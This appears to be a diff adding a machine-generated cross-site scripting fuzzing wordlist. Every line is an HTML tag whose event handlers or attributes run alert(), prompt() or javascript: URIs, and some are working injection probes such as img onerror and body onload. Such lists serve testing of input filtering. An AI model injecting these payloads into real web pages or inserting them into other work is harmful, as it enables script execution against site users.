+<audio Popover='//google.com' Oninput='alert(2)' Onplay='alert(1)' Data-info='test'>alert(1)</audio>
+<video On='//google.com' Onkeydown='alert(2)' Src='alert(1)' Data-test='test'>alert(1)</video>
+<script Onselect='alert(1)' Src='alert(1)' Autoplay>alert()</script>
+<img Autofocus='javascript:alert(3)' Onload='alert(3)' Src='alert(1)' Data-test='prompt(1)' />
+<iframe Oninput='alert(1)' Onload='alert(1)' Only>alert()</iframe>
+<video Popover='//google.com' Onclick='alert(2)' Autoplay='alert(1)' Data-xss='test'>alert(1)</video>
+<video On='//google.com' Onkeyup='alert(2)' Autoplay='alert(1)' Data-custom='test'>alert(1)</video>
+<video Autofocus='//google.com' Onkeydown='alert(2)' Onplay='alert(1)' Data-xss='test'>alert(1)</video>
+<iframe Onpaste='alert(1)' Src='alert(1)' Autofocus>alert()</iframe>
+<img Autofocus='javascript:alert(3)' Onsubmit='alert(3)' Onerror='alert(1)' Data-test='prompt(1)' />
+<svg Onmouseover='alert(1)' Onmouseover='alert(1)' Href>alert()</svg>
+<input Autofocus='javascript:alert(3)' Onblur='alert(3)' Onchange='alert(1)' Data-custom='prompt(1)' />
+<script Onkeyup='alert(1)' Type='alert(1)' On>alert()</script>
+<video Only='//google.com' Onblur='alert(2)' Autoplay='alert(1)' Data-info='test'>alert(1)</video>
+<iframe Onfocus='alert(1)' Src='alert(1)' Only>alert()</iframe>
+<iframe Onmouseover='alert(1)' Src='alert(1)' Autoplay>alert()</iframe>
+<form On='javascript:alert(3)' Onsubmit='alert(3)' Action='alert(1)' Data-xss='prompt(1)' />
+<video Href='//google.com' Onchange='alert(2)' Autoplay='alert(1)' Data-xss='test'>alert(1)</video>
+<script Ontoggle='alert(1)' Src='alert(1)' Popover>alert()</script>
+<script Onkeydown='alert(1)' Src='alert(1)' Href>alert()</script>
+<form Autoplay='javascript:alert(3)' Onfocus='alert(3)' Onsubmit='alert(1)' Data-custom='prompt(1)' />
+<body Popover='javascript:alert(3)' Onfocus='alert(3)' Onerror='alert(1)' Data-custom='prompt(1)' />
+<body Href='javascript:alert(3)' Onselect='alert(3)' Onload='alert(1)' Data-test='prompt(1)' />
+<script Onpaste='alert(1)' Type='alert(1)' Href>alert()</script>
+<video Only='//google.com' Onsubmit='alert(2)' Src='alert(1)' Data-test='test'>alert(1)</video>
+<input On='javascript:alert(3)' Onblur='alert(3)' Onchange='alert(1)' Data-test='prompt(1)' />
+<svg Onpaste='alert(1)' Onmouseover='alert(1)' Only>alert()</svg>
+<form Autofocus='javascript:alert(3)' Onchange='alert(3)' Action='alert(1)' Data-test='prompt(1)' />
+<input Autofocus='javascript:alert(3)' Onkeyup='alert(3)' Value='alert(1)' Data-xss='prompt(1)' />
+<audio Href='//google.com' Onsubmit='alert(2)' Onplay='alert(1)' Data-info='test'>alert(1)</audio>
+<video Href='//google.com' Onsubmit='alert(2)' Src='alert(1)' Data-info='test'>alert(1)</video>
+<svg Onselect='alert(1)' Style='alert(1)' Autoplay>alert()</svg>
+<form Popover='javascript:alert(3)' Onsubmit='alert(3)' Action='alert(1)' Data-test='prompt(1)' />
+<iframe Onkeydown='alert(1)' Onload='alert(1)' Only>alert()</iframe>
+<input Autoplay='javascript:alert(3)' Onmouseover='alert(3)' Value='alert(1)' Data-custom='prompt(1)' />
+<img Only='javascript:alert(3)' Onselect='alert(3)' Onerror='alert(1)' Data-test='prompt(1)' />
+<form Only='javascript:alert(3)' Onkeyup='alert(3)' Onsubmit='alert(1)' Data-test='prompt(1)' />
+<audio Autoplay='//google.com' Onmouseover='alert(2)' Autoplay='alert(1)' Data-custom='test'>alert(1)</audio>
+<form Only='javascript:alert(3)' Onchange='alert(3)' Onsubmit='alert(1)' Data-test='prompt(1)' />
+<form Only='javascript:alert(3)' Onkeydown='alert(3)' Action='alert(1)' Data-xss='prompt(1)' />
+<svg Onchange='alert(1)' Onload='alert(1)' Popover>alert()</svg>
+<audio Popover='//google.com' Onselect='alert(2)' Onplay='alert(1)' Data-info='test'>alert(1)</audio>
+<img Popover='javascript:alert(3)' Onmouseover='alert(3)' Onerror='alert(1)' Data-test='prompt(1)' />
+<input On='javascript:alert(3)' Onpaste='alert(3)' Onchange='alert(1)' Data-test='prompt(1)' />
+<img Popover='javascript:alert(3)' Onblur='alert(3)' Alt='alert(1)' Data-info='prompt(1)' />
+<video On='//google.com' Onblur='alert(2)' Onplay='alert(1)' Data-xss='test'>alert(1)</video>
+<img Autofocus='javascript:alert(3)' Onkeyup='alert(3)' Src='alert(1)' Data-test='prompt(1)' />
+<audio Only='//google.com' Ontoggle='alert(2)' Src='alert(1)' Data-info='test'>alert(1)</audio>
+<script Onselect='alert(1)' Src='alert(1)' Only>alert()</script>
+<video On='//google.com' Onblur='alert(2)' Onplay='alert(1)' Data-test='test'>alert(1)</video>
+<script Ontoggle='alert(1)' Type='alert(1)' Only>alert()</script>
+<img On='javascript:alert(3)' Onmouseover='alert(3)' Alt='alert(1)' Data-custom='prompt(1)' />
+<body Autofocus='javascript:alert(3)' Onpaste='alert(3)' Onload='alert(1)' Data-custom='prompt(1)' />
+<input Href='javascript:alert(3)' Ontoggle='alert(3)' Onfocus='alert(1)' Data-test='prompt(1)' />
+<body Popover='javascript:alert(3)' Onfocus='alert(3)' Onload='alert(1)' Data-info='prompt(1)' />
+<script Onfocus='alert(1)' Src='alert(1)' Only>alert()</script>
+<video Autofocus='//google.com' Onblur='alert(2)' Onplay='alert(1)' Data-test='test'>alert(1)</video>
+<audio Popover='//google.com' Oninput='alert(2)' Src='alert(1)' Data-test='test'>alert(1)</audio>
+<script Onselect='alert(1)' Src='alert(1)' Autoplay>alert()</script>
+<video Popover='//google.com' Onmouseover='alert(2)' Onplay='alert(1)' Data-test='test'>alert(1)</video>
+<img Popover='javascript:alert(3)' Onpaste='alert(3)' Onerror='alert(1)' Data-custom='prompt(1)' />
+<audio Only='//google.com' Onclick='alert(2)' Autoplay='alert(1)' Data-custom='test'>alert(1)</audio>
+<img Href='javascript:alert(3)' Onsubmit='alert(3)' Onerror='alert(1)' Data-xss='prompt(1)' />
+<audio On='//google.com' Onkeydown='alert(2)' Onplay='alert(1)' Data-test='test'>alert(1)</audio>
+<audio Autoplay='//google.com' Onpaste='alert(2)' Src='alert(1)' Data-test='test'>alert(1)</audio>
+<input Popover='javascript:alert(3)' Onselect='alert(3)' Value='alert(1)' Data-info='prompt(1)' />
+<form Only='javascript:alert(3)' Onclick='alert(3)' Action='alert(1)' Data-info='prompt(1)' />
+<svg Oninput='alert(1)' Onmouseover='alert(1)' Only>alert()</svg>
+<body Autoplay='javascript:alert(3)' Oninput='alert(3)' Onload='alert(1)' Data-test='prompt(1)' />
+<audio Href='//google.com' Onselect='alert(2)' Onplay='alert(1)' Data-test='test'>alert(1)</audio>
+<body Href='javascript:alert(3)' Onkeydown='alert(3)' Onerror='alert(1)' Data-test='prompt(1)' />
+<iframe Onmouseover='alert(1)' Onload='alert(1)' Autoplay>alert()</iframe>
+<img On='javascript:alert(3)' Onselect='alert(3)' Src='alert(1)' Data-info='prompt(1)' />
+<input On='javascript:alert(3)' Onclick='alert(3)' Onchange='alert(1)' Data-info='prompt(1)' />
+<input Only='javascript:alert(3)' Ontoggle='alert(3)' Onchange='alert(1)' Data-custom='prompt(1)' />
+<form Autoplay='javascript:alert(3)' Onclick='alert(3)' Action='alert(1)' Data-test='prompt(1)' />
+<input Autoplay='javascript:alert(3)' Onchange='alert(3)' Value='alert(1)' Data-test='prompt(1)' />
+<video Autofocus='//google.com' Onsubmit='alert(2)' Autoplay='alert(1)' Data-test='test'>alert(1)</video>
+<video Autoplay='//google.com' Onload='alert(2)' Src='alert(1)' Data-info='test'>alert(1)</video>
+<script Oninput='alert(1)' Src='alert(1)' Autoplay>alert()</script>
+<iframe Onclick='alert(1)' Onload='alert(1)' Only>alert()</iframe>
+<form Autoplay='javascript:alert(3)' Onblur='alert(3)' Action='alert(1)' Data-test='prompt(1)' />
+<body Autoplay='javascript:alert(3)' Oninput='alert(3)' Onload='alert(1)' Data-custom='prompt(1)' />
+<video Only='//google.com' Onsubmit='alert(2)' Onplay='alert(1)' Data-test='test'>alert(1)</video>
+<video Popover='//google.com' Onpaste='alert(2)' Autoplay='alert(1)' Data-custom='test'>alert(1)</video>
+<audio Autofocus='//google.com' Onsubmit='alert(2)' Autoplay='alert(1)' Data-custom='test'>alert(1)</audio>
+<svg Onerror='alert(1)' Onmouseover='alert(1)' On>alert()</svg>
+<script Onkeydown='alert(1)' Type='alert(1)' Autofocus>alert()</script>
+<iframe Onsubmit='alert(1)' Src='alert(1)' Popover>alert()</iframe>
+<img Popover='javascript:alert(3)' Onkeyup='alert(3)' Onerror='alert(1)' Data-info='prompt(1)' />
+<iframe Onblur='alert(1)' Src='alert(1)' Autofocus>alert()</iframe>
+<video On='//google.com' Onchange='alert(2)' Autoplay='alert(1)' Data-test='test'>alert(1)</video>
+<iframe Ontoggle='alert(1)' Src='alert(1)' Href>alert()</iframe>
+<script Onmouseover='alert(1)' Src='alert(1)' Autofocus>alert()</script>
+<video On='//google.com' Onblur='alert(2)' Autoplay='alert(1)' Data-test='test'>alert(1)</video>
+<iframe Ontoggle='alert(1)' Onload='alert(1)' Popover>alert()</iframe>
+<form On='javascript:alert(3)' Onblur='alert(3)' Action='alert(1)' Data-custom='prompt(1)' />
+<audio Autofocus='//google.com' Onsubmit='alert(2)' Onplay='alert(1)' Data-info='test'>alert(1)</audio>
+<iframe Onchange='alert(1)' Onload='alert(1)' Only>alert()</iframe>
+<script Onerror='alert(1)' Type='alert(1)' Href>alert()</script>
+<audio Autoplay='//google.com' Onblur='alert(2)' Autoplay='alert(1)' Data-xss='test'>alert(1)</audio>
+<form Popover='javascript:alert(3)' Onclick='alert(3)' Onsubmit='alert(1)' Data-custom='prompt(1)' />
+<video Href='//google.com' Oninput='alert(2)' Autoplay='alert(1)' Data-custom='test'>alert(1)</video>
+<video Popover='//google.com' Onblur='alert(2)' Onplay='alert(1)' Data-xss='test'>alert(1)</video>
+<body Autoplay='javascript:alert(3)' Oninput='alert(3)' Onload='alert(1)' Data-xss='prompt(1)' />
+<iframe Ontoggle='alert(1)' Onload='alert(1)' Href>alert()</iframe>
+<iframe Onfocus='alert(1)' Src='alert(1)' Href>alert()</iframe>
+<video Only='//google.com' Oninput='alert(2)' Autoplay='alert(1)' Data-info='test'>alert(1)</video>
+<script Onchange='alert(1)' Src='alert(1)' Autoplay>alert()</script>
+<svg Oninput='alert(1)' Onmouseover='alert(1)' Autoplay>alert()</svg>
+<audio Autofocus='//google.com' Onpaste='alert(2)' Onplay='alert(1)' Data-xss='test'>alert(1)</audio>
+<input Autofocus='javascript:alert(3)' Onkeydown='alert(3)' Value='alert(1)' Data-info='prompt(1)' />
+<form Only='javascript:alert(3)' Onkeyup='alert(3)' Onsubmit='alert(1)' Data-info='prompt(1)' />
+<script Ontoggle='alert(1)' Type='alert(1)' On>alert()</script>
+<audio Only='//google.com' Onload='alert(2)' Autoplay='alert(1)' Data-info='test'>alert(1)</audio>
+<script Onerror='alert(1)' Type='alert(1)' Href>alert()</script>
+<img Popover='javascript:alert(3)' Onclick='alert(3)' Src='alert(1)' Data-test='prompt(1)' />
+<form Autofocus='javascript:alert(3)' Oninput='alert(3)' Onsubmit='alert(1)' Data-info='prompt(1)' />
+<form Autofocus='javascript:alert(3)' Onblur='alert(3)' Onsubmit='alert(1)' Data-info='prompt(1)' />
+<input Href='javascript:alert(3)' Onpaste='alert(3)' Onfocus='alert(1)' Data-custom='prompt(1)' />
+<audio Popover='//google.com' Onkeyup='alert(2)' Autoplay='alert(1)' Data-info='test'>alert(1)</audio>
+<input Href='javascript:alert(3)' Onfocus='alert(3)' Onfocus='alert(1)' Data-xss='prompt(1)' />
+<img Popover='javascript:alert(3)' Onerror='alert(3)' Onerror='alert(1)' Data-info='prompt(1)' />
+<audio On='//google.com' Ontoggle='alert(2)' Src='alert(1)' Data-xss='test'>alert(1)</audio>
+<video Href='//google.com' Onfocus='alert(2)' Autoplay='alert(1)' Data-info='test'>alert(1)</video>
+<svg Onblur='alert(1)' Style='alert(1)' On>alert()</svg>
+<audio Href='//google.com' Onblur='alert(2)' Src='alert(1)' Data-xss='test'>alert(1)</audio>
+<video Autofocus='//google.com' Onselect='alert(2)' Src='alert(1)' Data-xss='test'>alert(1)</video>
+<body Autoplay='javascript:alert(3)' Onblur='alert(3)' Onerror='alert(1)' Data-info='prompt(1)' />
+<svg Onload='alert(1)' Style='alert(1)' Popover>alert()</svg>
+<img Autoplay='javascript:alert(3)' Ontoggle='alert(3)' Alt='alert(1)' Data-test='prompt(1)' />
+<form Autoplay='javascript:alert(3)' Onkeyup='alert(3)' Action='alert(1)' Data-xss='prompt(1)' />
+<script Onchange='alert(1)' Src='alert(1)' Autoplay>alert()</script>
+<img Autofocus='javascript:alert(3)' Onblur='alert(3)' Alt='alert(1)' Data-custom='prompt(1)' />
+<script Onchange='alert(1)' Type='alert(1)' Autofocus>alert()</script>
+<script Onclick='alert(1)' Type='alert(1)' Href>alert()</script>
+<iframe Onselect='alert(1)' Src='alert(1)' Href>alert()</iframe>
+<video On='//google.com' Onblur='alert(2)' Src='alert(1)' Data-custom='test'>alert(1)</video>
+<body On='javascript:alert(3)' Onselect='alert(3)' Onerror='alert(1)' Data-custom='prompt(1)' />
+<body Only='javascript:alert(3)' Onpaste='alert(3)' Onload='alert(1)' Data-info='prompt(1)' />
+<body Autoplay='javascript:alert(3)' Onsubmit='alert(3)' Onerror='alert(1)' Data-info='prompt(1)' />
+<input Autoplay='javascript:alert(3)' Onload='alert(3)' Value='alert(1)' Data-custom='prompt(1)' />
+<body Href='javascript:alert(3)' Ontoggle='alert(3)' Onload='alert(1)' Data-info='prompt(1)' />
+<body Href='javascript:alert(3)' Onload='alert(3)' Onerror='alert(1)' Data-info='prompt(1)' />
+<audio Href='//google.com' Onpaste='alert(2)' Src='alert(1)' Data-custom='test'>alert(1)</audio>
+<img Popover='javascript:alert(3)' Onkeydown='alert(3)' Onerror='alert(1)' Data-test='prompt(1)' />
+<script Onselect='alert(1)' Src='alert(1)' Href>alert()</script>
+<form Popover='javascript:alert(3)' Onkeyup='alert(3)' Onsubmit='alert(1)' Data-test='prompt(1)' />
+<iframe Onblur='alert(1)' Src='alert(1)' Href>alert()</iframe>
+<input Only='javascript:alert(3)' Onblur='alert(3)' Value='alert(1)' Data-custom='prompt(1)' />
+<script Onselect='alert(1)' Type='alert(1)' Href>alert()</script>
+<form On='javascript:alert(3)' Onpaste='alert(3)' Action='alert(1)' Data-info='prompt(1)' />
+<iframe Onclick='alert(1)' Onload='alert(1)' Autofocus>alert()</iframe>
+<input Only='javascript:alert(3)' Onselect='alert(3)' Onfocus='alert(1)' Data-custom='prompt(1)' />
+<img Autofocus='javascript:alert(3)' Ontoggle='alert(3)' Src='alert(1)' Data-info='prompt(1)' />
+<input Autoplay='javascript:alert(3)' Onblur='alert(3)' Onchange='alert(1)' Data-info='prompt(1)' />
+<video Autoplay='//google.com' Onselect='alert(2)' Autoplay='alert(1)' Data-xss='test'>alert(1)</video>
+<script Onselect='alert(1)' Type='alert(1)' On>alert()</script>
+<body Autofocus='javascript:alert(3)' Onfocus='alert(3)' Onerror='alert(1)' Data-xss='prompt(1)' />
+<input Only='javascript:alert(3)' Onkeyup='alert(3)' Value='alert(1)' Data-test='prompt(1)' />
+<svg Ontoggle='alert(1)' Style='alert(1)' Popover>alert()</svg>
+<img Autoplay='javascript:alert(3)' Onkeyup='alert(3)' Src='alert(1)' Data-test='prompt(1)' />
+<body Only='javascript:alert(3)' Onload='alert(3)' Onload='alert(1)' Data-info='prompt(1)' />
+<input On='javascript:alert(3)' Onsubmit='alert(3)' Onchange='alert(1)' Data-custom='prompt(1)' />
+<script Onmouseover='alert(1)' Type='alert(1)' Autofocus>alert()</script>
+<video Only='//google.com' Onsubmit='alert(2)' Autoplay='alert(1)' Data-info='test'>alert(1)</video>
+<img Href='javascript:alert(3)' Onkeydown='alert(3)' Src='alert(1)' Data-test='prompt(1)' />
+<script Onchange='alert(1)' Src='alert(1)' Autofocus>alert()</script>
+<audio Autofocus='//google.com' Onmouseover='alert(2)' Autoplay='alert(1)' Data-test='test'>alert(1)</audio>
+<script Onmouseover='alert(1)' Type='alert(1)' Popover>alert()</script>
+<svg Onblur='alert(1)' Style='alert(1)' On>alert()</svg>
+<form Href='javascript:alert(3)' Onmouseover='alert(3)' Action='alert(1)' Data-xss='prompt(1)' />
+<body On='javascript:alert(3)' Onchange='alert(3)' Onload='alert(1)' Data-test='prompt(1)' />
+<iframe Onclick='alert(1)' Src='alert(1)' Autofocus>alert()</iframe>
+<iframe Onsubmit='alert(1)' Src='alert(1)' Href>alert()</iframe>
+<form On='javascript:alert(3)' Onblur='alert(3)' Action='alert(1)' Data-test='prompt(1)' />
+<iframe Onmouseover='alert(1)' Onload='alert(1)' Only>alert()</iframe>
+<video Only='//google.com' Onkeydown='alert(2)' Autoplay='alert(1)' Data-info='test'>alert(1)</video>
+<input Autoplay='javascript:alert(3)' Onmouseover='alert(3)' Value='alert(1)' Data-test='prompt(1)' />
+<svg Ontoggle='alert(1)' Onload='alert(1)' Autoplay>alert()</svg>
+<form Autofocus='javascript:alert(3)' Oninput='alert(3)' Onsubmit='alert(1)' Data-xss='prompt(1)' />
+<body Autofocus='javascript:alert(3)' Onkeyup='alert(3)' Onload='alert(1)' Data-test='prompt(1)' />
+<script Onkeydown='alert(1)' Type='alert(1)' Autoplay>alert()</script>
+<img On='javascript:alert(3)' Onload='alert(3)' Onerror='alert(1)' Data-info='prompt(1)' />
+<script Onkeyup='alert(1)' Src='alert(1)' Href>alert()</script>
+<svg Onselect='alert(1)' Style='alert(1)' On>alert()</svg>
+<body On='javascript:alert(3)' Onmouseover='alert(3)' Onload='alert(1)' Data-test='prompt(1)' />
+<form Autoplay='javascript:alert(3)' Onchange='alert(3)' Onsubmit='alert(1)' Data-test='prompt(1)' />
+<img Autofocus='javascript:alert(3)' Onblur='alert(3)' Alt='alert(1)' Data-test='prompt(1)' />
+<img Only='javascript:alert(3)' Onpaste='alert(3)' Src='alert(1)' Data-info='prompt(1)' />
+<body Autoplay='javascript:alert(3)' Onmouseover='alert(3)' Onerror='alert(1)' Data-info='prompt(1)' />
+<script Onmouseover='alert(1)' Type='alert(1)' Popover>alert()</script>
+<iframe Onselect='alert(1)' Onload='alert(1)' Only>alert()</iframe>
+<input On='javascript:alert(3)' Onpaste='alert(3)' Value='alert(1)' Data-xss='prompt(1)' />
+<form On='javascript:alert(3)' Onpaste='alert(3)' Action='alert(1)' Data-test='prompt(1)' />
+<svg Onsubmit='alert(1)' Onload='alert(1)' Autofocus>alert()</svg>
+<script Onkeydown='alert(1)' Src='alert(1)' Href>alert()</script>
+<script Oninput='alert(1)' Type='alert(1)' On>alert()</script>
+<img Autofocus='javascript:alert(3)' Onblur='alert(3)' Src='alert(1)' Data-info='prompt(1)' />
+<svg Onblur='alert(1)' Onmouseover='alert(1)' Autoplay>alert()</svg>
+<svg Onmouseover='alert(1)' Style='alert(1)' Popover>alert()</svg>
+<iframe Onblur='alert(1)' Src='alert(1)' Popover>alert()</iframe>
+<script Onchange='alert(1)' Type='alert(1)' Href>alert()</script>
+<audio Autoplay='//google.com' Onblur='alert(2)' Src='alert(1)' Data-xss='test'>alert(1)</audio>
+<audio Only='//google.com' Ontoggle='alert(2)' Onplay='alert(1)' Data-xss='test'>alert(1)</audio>
+<input Href='javascript:alert(3)' Onload='alert(3)' Value='alert(1)' Data-xss='prompt(1)' />
+<audio Autofocus='//google.com' Onload='alert(2)' Autoplay='alert(1)' Data-info='test'>alert(1)</audio>
+<video Autofocus='//google.com' Onsubmit='alert(2)' Autoplay='alert(1)' Data-custom='test'>alert(1)</video>
+<img On='javascript:alert(3)' Onerror='alert(3)' Alt='alert(1)' Data-xss='prompt(1)' />
+<video Autoplay='//google.com' Onselect='alert(2)' Onplay='alert(1)' Data-info='test'>alert(1)</video>
+<video Autofocus='//google.com' Onsubmit='alert(2)' Src='alert(1)' Data-xss='test'>alert(1)</video>
+<input Autoplay='javascript:alert(3)' Ontoggle='alert(3)' Value='alert(1)' Data-custom='prompt(1)' />
+<form Popover='javascript:alert(3)' Onmouseover='alert(3)' Action='alert(1)' Data-xss='prompt(1)' />
+<form Popover='javascript:alert(3)' Onmouseover='alert(3)' Action='alert(1)' Data-test='prompt(1)' />
+<form On='javascript:alert(3)' Onerror='alert(3)' Onsubmit='alert(1)' Data-info='prompt(1)' />
+<iframe Oninput='alert(1)' Src='alert(1)' Popover>alert()</iframe>
+<input Popover='javascript:alert(3)' Onload='alert(3)' Onfocus='alert(1)' Data-test='prompt(1)' />
+<video On='//google.com' Oninput='alert(2)' Autoplay='alert(1)' Data-custom='test'>alert(1)</video>
+<form Autoplay='javascript:alert(3)' Onload='alert(3)' Onsubmit='alert(1)' Data-info='prompt(1)' />
+<video On='//google.com' Onfocus='alert(2)' Autoplay='alert(1)' Data-xss='test'>alert(1)</video>
+<svg Onload='alert(1)' Style='alert(1)' Autofocus>alert()</svg>
+<body Popover='javascript:alert(3)' Onkeydown='alert(3)' Onload='alert(1)' Data-xss='prompt(1)' />
+<video Only='//google.com' Onerror='alert(2)' Onplay='alert(1)' Data-custom='test'>alert(1)</video>
+<img On='javascript:alert(3)' Onerror='alert(3)' Alt='alert(1)' Data-xss='prompt(1)' />
+<video On='//google.com' Onerror='alert(2)' Src='alert(1)' Data-info='test'>alert(1)</video>
+<img Only='javascript:alert(3)' Onsubmit='alert(3)' Src='alert(1)' Data-custom='prompt(1)' />
+<form On='javascript:alert(3)' Onsubmit='alert(3)' Onsubmit='alert(1)' Data-test='prompt(1)' />
+<input Only='javascript:alert(3)' Onclick='alert(3)' Onfocus='alert(1)' Data-custom='prompt(1)' />
+<body Href='javascript:alert(3)' Onblur='alert(3)' Onerror='alert(1)' Data-test='prompt(1)' />
+<script Onchange='alert(1)' Src='alert(1)' Only>alert()</script>
+<audio On='//google.com' Onblur='alert(2)' Autoplay='alert(1)' Data-info='test'>alert(1)</audio>
+<body Only='javascript:alert(3)' Onclick='alert(3)' Onerror='alert(1)' Data-xss='prompt(1)' />
+<video Autoplay='//google.com' Onmouseover='alert(2)' Onplay='alert(1)' Data-custom='test'>alert(1)</video>
+<img Popover='javascript:alert(3)' Onload='alert(3)' Alt='alert(1)' Data-xss='prompt(1)' />
+<body Only='javascript:alert(3)' Onsubmit='alert(3)' Onerror='alert(1)' Data-info='prompt(1)' />
+<body Only='javascript:alert(3)' Onblur='alert(3)' Onerror='alert(1)' Data-test='prompt(1)' />
+<script Onpaste='alert(1)' Type='alert(1)' Autoplay>alert()</script>
+<svg Onfocus='alert(1)' Style='alert(1)' Popover>alert()</svg>
+<script Ontoggle='alert(1)' Type='alert(1)' Popover>alert()</script>
+<svg Ontoggle='alert(1)' Onload='alert(1)' Only>alert()</svg>
+<body On='javascript:alert(3)' Onkeyup='alert(3)' Onerror='alert(1)' Data-test='prompt(1)' />
+<video Popover='//google.com' Onerror='alert(2)' Src='alert(1)' Data-test='test'>alert(1)</video>
+<input On='javascript:alert(3)' Onselect='alert(3)' Value='alert(1)' Data-custom='prompt(1)' />
+<img Autofocus='javascript:alert(3)' Onsubmit='alert(3)' Alt='alert(1)' Data-test='prompt(1)' />
+<svg Onsubmit='alert(1)' Onmouseover='alert(1)' Only>alert()</svg>
+<input Only='javascript:alert(3)' Onselect='alert(3)' Value='alert(1)' Data-xss='prompt(1)' />
+<script Onkeydown='alert(1)' Type='alert(1)' Popover>alert()</script>
+<body Autofocus='javascript:alert(3)' Onselect='alert(3)' Onload='alert(1)' Data-custom='prompt(1)' />
+<audio On='//google.com' Onload='alert(2)' Onplay='alert(1)' Data-xss='test'>alert(1)</audio>
+<script Onkeydown='alert(1)' Type='alert(1)' Only>alert()</script>
+<script Onerror='alert(1)' Src='alert(1)' Autofocus>alert()</script>
+<img On='javascript:alert(3)' Ontoggle='alert(3)' Alt='alert(1)' Data-info='prompt(1)' />
+<body Only='javascript:alert(3)' Ontoggle='alert(3)' Onerror='alert(1)' Data-custom='prompt(1)' />
+<svg Onfocus='alert(1)' Style='alert(1)' Only>alert()</svg>
+<form Autoplay='javascript:alert(3)' Oninput='alert(3)' Action='alert(1)' Data-custom='prompt(1)' />
+<body Href='javascript:alert(3)' Onpaste='alert(3)' Onload='alert(1)' Data-test='prompt(1)' />
+<body Autoplay='javascript:alert(3)' Onkeydown='alert(3)' Onerror='alert(1)' Data-test='prompt(1)' />
+<img Popover='javascript:alert(3)' Onload='alert(3)' Src='alert(1)' Data-info='prompt(1)' />
+<form On='javascript:alert(3)' Onfocus='alert(3)' Onsubmit='alert(1)' Data-test='prompt(1)' />
+<audio Popover='//google.com' Onkeyup='alert(2)' Src='alert(1)' Data-custom='test'>alert(1)</audio>
+<form On='javascript:alert(3)' Onclick='alert(3)' Onsubmit='alert(1)' Data-info='prompt(1)' />
+<img Autofocus='javascript:alert(3)' Onfocus='alert(3)' Alt='alert(1)' Data-info='prompt(1)' />
+<iframe Ontoggle='alert(1)' Onload='alert(1)' Popover>alert()</iframe>
+<audio Autofocus='//google.com' Onerror='alert(2)' Onplay='alert(1)' Data-test='test'>alert(1)</audio>
+<script Ontoggle='alert(1)' Src='alert(1)' On>alert()</script>
+<video Autoplay='//google.com' Onerror='alert(2)' Autoplay='alert(1)' Data-xss='test'>alert(1)</video>
+<video Href='//google.com' Onselect='alert(2)' Src='alert(1)' Data-xss='test'>alert(1)</video>
+<img Autoplay='javascript:alert(3)' Onerror='alert(3)' Onerror='alert(1)' Data-xss='prompt(1)' />
+<script Onsubmit='alert(1)' Type='alert(1)' Popover>alert()</script>
+<script Onerror='alert(1)' Type='alert(1)' Autoplay>alert()</script>
+<audio Only='//google.com' Onselect='alert(2)' Src='alert(1)' Data-info='test'>alert(1)</audio>
+<script Ontoggle='alert(1)' Type='alert(1)' On>alert()</script>
+<video On='//google.com' Onkeyup='alert(2)' Onplay='alert(1)' Data-custom='test'>alert(1)</video>
+<input On='javascript:alert(3)' Onkeyup='alert(3)' Onchange='alert(1)' Data-test='prompt(1)' />
+<script Onclick='alert(1)' Type='alert(1)' Autofocus>alert()</script>
+<input Autofocus='javascript:alert(3)' Onpaste='alert(3)' Value='alert(1)' Data-custom='prompt(1)' />
+<audio Href='//google.com' Onkeyup='alert(2)' Autoplay='alert(1)' Data-info='test'>alert(1)</audio>
+<video Popover='//google.com' Onclick='alert(2)' Onplay='alert(1)' Data-info='test'>alert(1)</video>
+<body Autofocus='javascript:alert(3)' Onload='alert(3)' Onerror='alert(1)' Data-test='prompt(1)' />
+<script Onload='alert(1)' Src='alert(1)' Href>alert()</script>
+<script Onchange='alert(1)' Src='alert(1)' Autoplay>alert()</script>
+<svg Onclick='alert(1)' Onmouseover='alert(1)' Autoplay>alert()</svg>
+<video Popover='//google.com' Oninput='alert(2)' Src='alert(1)' Data-info='test'>alert(1)</video>
+<audio Only='//google.com' Onerror='alert(2)' Onplay='alert(1)' Data-custom='test'>alert(1)</audio>
+<form Autofocus='javascript:alert(3)' Onpaste='alert(3)' Action='alert(1)' Data-xss='prompt(1)' />
+<script Onkeydown='alert(1)' Type='alert(1)' Only>alert()</script>
+<form Autofocus='javascript:alert(3)' Onkeyup='alert(3)' Action='alert(1)' Data-xss='prompt(1)' />
+<audio On='//google.com' Onchange='alert(2)' Onplay='alert(1)' Data-custom='test'>alert(1)</audio>
+<iframe Onsubmit='alert(1)' Onload='alert(1)' Only>alert()</iframe>
+<video Href='//google.com' Onkeydown='alert(2)' Onplay='alert(1)' Data-xss='test'>alert(1)</video>
+<input Popover='javascript:alert(3)' Onselect='alert(3)' Value='alert(1)' Data-xss='prompt(1)' />
+<body Only='javascript:alert(3)' Onblur='alert(3)' Onload='alert(1)' Data-info='prompt(1)' />
+<audio Popover='//google.com' Onsubmit='alert(2)' Autoplay='alert(1)' Data-info='test'>alert(1)</audio>
+<video On='//google.com' Onmouseover='alert(2)' Src='alert(1)' Data-custom='test'>alert(1)</video>
+<video Only='//google.com' Onfocus='alert(2)' Src='alert(1)' Data-custom='test'>alert(1)</video>
+<form Href='javascript:alert(3)' Onselect='alert(3)' Onsubmit='alert(1)' Data-xss='prompt(1)' />
+<iframe Onchange='alert(1)' Src='alert(1)' Href>alert()</iframe>
+<iframe Ontoggle='alert(1)' Onload='alert(1)' Autofocus>alert()</iframe>
+<form Autoplay='javascript:alert(3)' Onload='alert(3)' Onsubmit='alert(1)' Data-custom='prompt(1)' />
+<form Href='javascript:alert(3)' Onkeydown='alert(3)' Action='alert(1)' Data-info='prompt(1)' />
+<audio On='//google.com' Onerror='alert(2)' Autoplay='alert(1)' Data-test='test'>alert(1)</audio>
+<form Only='javascript:alert(3)' Onmouseover='alert(3)' Onsubmit='alert(1)' Data-custom='prompt(1)' />
+<form Only='javascript:alert(3)' Onsubmit='alert(3)' Onsubmit='alert(1)' Data-custom='prompt(1)' />
+<form Autoplay='javascript:alert(3)' Onfocus='alert(3)' Onsubmit='alert(1)' Data-xss='prompt(1)' />
+<audio Href='//google.com' Onkeyup='alert(2)' Src='alert(1)' Data-xss='test'>alert(1)</audio>
+<body Popover='javascript:alert(3)' Onfocus='alert(3)' Onerror='alert(1)' Data-test='prompt(1)' />
+<svg Onload='alert(1)' Onload='alert(1)' Href>alert()</svg>
